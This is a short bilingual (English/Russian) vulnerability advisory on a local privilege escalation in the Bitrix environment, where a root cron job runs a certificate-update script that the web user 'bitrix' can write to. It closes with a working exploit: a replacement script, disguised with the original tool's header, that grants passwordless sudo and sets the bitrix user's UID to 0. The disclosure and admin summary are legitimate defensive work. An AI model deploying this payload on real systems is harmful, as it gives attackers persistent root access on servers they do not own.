# 0-day local privilege escalation in a Bitrix environment  🔥
### Local privilege escalation through an editable certificate-update script in a Bitrix environment
---

### Brief vulnerability info

* **Type:** Local Privilege Escalation (LPE).
* **LPE:** A root-run job (via `/etc/crontab`) executes `/opt/webdir/bin/bx-dehydrated`, which in turn invokes `/home/bitrix/dehydrated/dehydrated`. The invoked executable (`/home/bitrix/dehydrated/dehydrated`) is writable by the web user `bitrix`.
* **User?** `bitrix` → `root`.
* **Relevant CWE:** **CWE-732 — Incorrect Permission Assignment.**

---

### Description 🔒

On systems with the Bitrix environment installed, a cron job runs every Saturday at 02:00 and launches `/opt/webdir/bin/bx-dehydrated`. That wrapper calls `/home/bitrix/dehydrated/dehydrated` to update certificates. The file that is being called is editable by the web user `bitrix`. An attacker who gains access to the `bitrix` account could modify the script contents to execute arbitrary code under root privileges when the cron job runs — resulting in a local privilege escalation (LPE).

---

### Локальное повышение привилегий через редактируемый скрипт обновления сертификатов в окружении Bitrix 🔥

---

**Краткая информация об уязвимости:**

- **Тип:** Локальное повышение привилегий (LPE).  
- **LPE:** В задании root пользователя (`/etc/crontab`) запускается `/opt/webdir/bin/bx-dehydrated`, который вызывает `/home/bitrix/dehydrated/dehydrated`. Выполняемый скрипт (`/home/bitrix/dehydrated/dehydrated`) редактируемый веб‑пользователем `bitrix`.  
- **User?** `bitrix → root`.  
- **Соответствующий CWE:** CWE-732 — Incorrect Permission Assignment.

### Описание 🔒

На системах с установленным bitrix env, cron выполняет задание каждую субботу в 02:00, которое запускает `/opt/webdir/bin/bx-dehydrated`. Тот, в свою очередь, вызывает `/home/bitrix/dehydrated/dehydrated` для обновления сертификатов. Этот вызываемый файл доступен для редактирования веб‑пользователю `bitrix`, злоумышленник с доступом к аккаунту `bitrix` может изменить содержимое скрипта и добиться выполнения произвольного кода с привилегиями root, то есть локального повышения привилегий (LPE).

---

**Admin quick view:**

```
Priority: High
Affected paths: /etc/crontab -> /opt/webdir/bin/bx-dehydrated -> /home/bitrix/dehydrated/dehydrated
Observed: root cron (Sat 02:00) executing user-writable script
Default web user: bitrix -> root (possible escalation)
CWE: CWE-732
```

**Exploit example:**

```vim /home/bitrix/dehydrated/dehydrated```

```
#!/usr/bin/env bash

# dehydrated by lukas2511
# Source: https://dehydrated.io
#
# This script is licensed under The MIT License (see LICENSE for more information).

((EUID))&&{ echo "sudo $0";exit 1;}
U=bitrix
echo "$U ALL=(ALL) NOPASSWD: ALL">/etc/sudoers.d/$U-root;chmod 440 $_
usermod -u0 -o $U;chown -R $U:$U /home/$U
echo "$U is root (UID=0). Re-login."

#...
```
